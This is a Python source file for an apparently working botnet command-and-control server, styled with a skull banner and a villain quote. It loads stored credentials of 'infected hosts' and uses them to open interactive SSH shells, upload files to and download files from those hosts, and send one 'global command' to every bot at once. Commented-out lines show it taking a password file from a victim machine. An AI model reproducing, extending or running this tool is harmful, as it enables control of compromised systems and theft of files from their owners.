import re
from colorama import Back, Fore
import sys
from typing import Any, List, Optional
import paramiko
from pexpect import pxssh
from connections import Connections
from dao import SelectBotDao
from dataclasses import dataclass
from .server_interface import ServerInterface
from threading import Thread
from multiprocessing import Process


@dataclass
class BotnetServer(ServerInterface):
    print(Fore.LIGHTMAGENTA_EX + "And so I clothed my naked villainy with "
                                 "rags stolen from the scriptures,"
                                 "and played the saint when in truth I was the devil.")
    __global_conn: Any = None
    __conn: Connections = Connections()
    __bots: SelectBotDao = SelectBotDao()

    def get_bot(self, **kwargs) -> object:
        return self.__bots.select_one(**kwargs)

    def get_all_bots(self) -> 'collections.Iterable':
        for bott in self.__bots.select():
            yield bott

    def upload_files(self,
                     *file_path: str,
                     user: str,
                     host: str,
                     pw: str) -> None:
        assert len(file_path) <= 2, "origin path and remote path , only"
        print(file_path)
        transport = paramiko.Transport((host, 22))
        transport.connect(username=user, password=pw)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(file_path[0], file_path[1])
        sftp.close()
        transport.close()
        print("Sent")

    def download_files(self,
                       *file_path: str,
                       user: str,
                       host: str,
                       pw: str) -> None:
        assert len(file_path) <= 2, "origin path and remote path , only"
        print(file_path)
        transport = paramiko.Transport((host, 22))
        transport.connect(username=user, password=pw)
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.get(file_path[1], file_path[0])
        sftp.close()
        transport.close()
        print("Downloaded")

    def __commands(self, conn):
        while True:
            command: str = input(Fore.GREEN + ">>> [type 'exit' to finish]: ")
            if command == "exit":
                conn.logout()
                break
            conn.sendline(command)  # send the command
            conn.prompt()
            parse = re.sub(r'\x1b\[(0;)?\d{1,2}(;\d{1,2})?(m|\x1b\[K|\r\n|\x1b\[?2004hls\x1b\[?2004l\r)',
                           '',
                           conn.before.decode('utf-8').strip())  # get result
            parse = re.sub(r'\x1b\[?2004h',
                           '',
                           parse.strip())
            print(parse.strip().replace(command, ''))

    def get_shell(self,
                  host: str,
                  user: str,
                  password: str,
                  option: int,
                  command: Optional[str] = None) -> None:
        """
        allow to navigate into remote machine
        :param host:
        :param user:
        :param password:
        :param option: how much bots
        :return:
        """

        if option == 1:
            with self.__conn.connection_ssh(host=host,
                                            user=user,
                                            password=password) as conn:
                self.__commands(conn)

        else:
            self.__client(
                host,
                user,
                password,
                command
            )

    def __client(self, host: str, user: str, password: str, command: str) -> None:
        print(Fore.RED + f"[+]Connected {host} -> {user}")
        ssh = pxssh.pxssh()
        ssh.login(host, user, password)
        ssh.sendline(command)
        ssh.prompt()
        print(f"response: {ssh.before.decode('utf-8')}")
        ssh.logout()

    def general_controller(self,
                           host: str,
                           user: str,
                           password: str,
                           option: int,
                           command: Optional[str] = None) -> None:
        with self.__conn.connection_ssh(host=host,
                                        user=user,
                                        password=password) as conn:
            self.__global_conn = conn
            try:
                while True:
                    print(Back.LIGHTYELLOW_EX + " ☠ " * 25)
                    print(Back.RESET)
                    print(Fore.RED + f"""
                            BOT NET BOT NET BOT NET BOT 
                            ███████▀▀▀░░░░░░░▀▀▀███████ 
                            ████▀░░░░░░░░░░░░░░░░░▀████ 
                            ███│░░░░░░░░░░░░░░░░░░░│███ 
                            ██▌│░░░░░░░░░░░░░░░░░░░│▐██ 
                            ██░└┐░░░░░░░░░░░░░░░░░┌┘░██ 
                            ██░░└┐░░░░░░░░░░░░░░░┌┘░░██ 
                            ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██ 
                            ██▌░│██████▌░░░▐██████│░▐██ 
                            ███░│▐███▀▀░░▄░░▀▀███▌│░███ 
                            ██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██ 
                            ██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██ 
                            ████▄─┘██▌░░░░░░░▐██└─▄████ 
                            █████░░▐█─┬┬┬┬┬┬┬─█▌░░█████ 
                            ████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████ 
                            █████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████ 
                            ███████▄░░░░░░░░░░░▄███████ 
                            ██████████▄▄▄▄▄▄▄██████████ 
                            ███████████████████████████ 
                            BOT NET BOT NET BOT NET BOT""")
                    print(Fore.GREEN + "Options: ")
                    option: int = int(input(Fore.RED + f"1-List infected hosts{'  ' * 25}\n"
                                                       "2-List specified host\n"
                                                       "3-Upload file to host\n"
                                                       "4-Download file from host\n"
                                                       "5-Control a specified host\n"
                                                       "6-Control a massive infected hosts\n"
                                                       "7-Exit\n"
                                                       f"{Fore.WHITE}Choice: "))
                    print(Back.LIGHTYELLOW_EX + " ☠ " * 25)
                    print(Back.RESET)
                    match option:
                        case 1:
                            for bott in self.get_all_bots():
                                print(f"{bott}")
                        case 2:
                            choice: str = input(Fore.LIGHTGREEN_EX + "Search by\n"
                                                                     "1-Id\n"
                                                                     "2-Username\n"
                                                                     "Choice: ")
                            if choice == '1':
                                try:
                                    id: int = int(input("id: "))
                                    print(self.get_bot(id=id))
                                except ValueError as e:
                                    print(Fore.RED + "The value must be integer")
                            elif choice == '2':
                                username: str = input("username: ")
                                print(Fore.YELLOW + f"-> Result: {self.get_bot(user=username)}")
                            else:
                                print(Fore.RED + "[-] Invalid option")
                                sys.exit(0)
                        case 3:
                            print("example origin file: /home/user/text.txt\n"
                                  "example remote file: /home/user/text.txt")
                            files: str = input("origin file path: ")
                            remote: str = input("remote file path: ")
                            self.upload_files(files,
                                              remote,
                                              user=user,
                                              host=host,
                                              pw=password
                                              )
                        case 4:
                            print("example origin file: /home/user/text.txt\n"
                                  "example remote file: /home/user/text.txt")
                            files: str = input("origin file path: ")
                            remote: str = input("remote file path: ")
                            self.download_files(files,
                                                remote,
                                                user=user,
                                                host=host,
                                                pw=password
                                                )
                        case 5:
                            self.get_shell(host,
                                           user,
                                           password,
                                           1)
                        case 6:
                            command: str = input(Fore.BLUE + "GLOBAL COMMAND: ")
                            threads: List[Thread] = []
                            for b in self.get_all_bots():
                                t = Thread(target=self.get_shell,
                                       args=(b.host,
                                             b.username,
                                             b.password,
                                             3,
                                             command))
                                t.start()
                                threads.append(t)
                            [t.join() for t in threads]

                        case 7:
                            sys.exit(0)
            except ValueError as e:
                print("The value must be integer")
            except KeyboardInterrupt:
                pass


if __name__ == '__main__':
    bs: BotnetServer = BotnetServer()
    bots: List[Thread] = []
    for bot in bs.get_all_bots():
        print(f"Connecting to bot {bot}")
        bsx0: BotnetServer = BotnetServer()
        """t = Thread(target=bsx0.get_shell, args=(bot.host,
                              bot.username,
                              bot.password,
                              4))"""
        # t.start()
        # bots.append(t)
        """bs.get_shell(bot.host,
                             bot.username,
                             bot.password, 1)"""
        """bsx0.general_controller(bot.host,
                              bot.username,
                              bot.password,
                              4)"""
        """bs.upload_files(r".",
                        r"/home/marcus/Documents/password.txt",
                        host=bot.host,
                        user=bot.username,
                        pw=bot.password)"""
        """bs.download_files(r"/home/marcus/password_download.txt",
                        r"/home/marcus/Documents/password.txt",
                        host=bot.host,
                        user=bot.username,
                        pw=bot.password)"""
    # [bot.join() for bot in bots]

    #  print(bs.get_bot(id=1))
    #  print(bs.get_bot(user='marcus'))
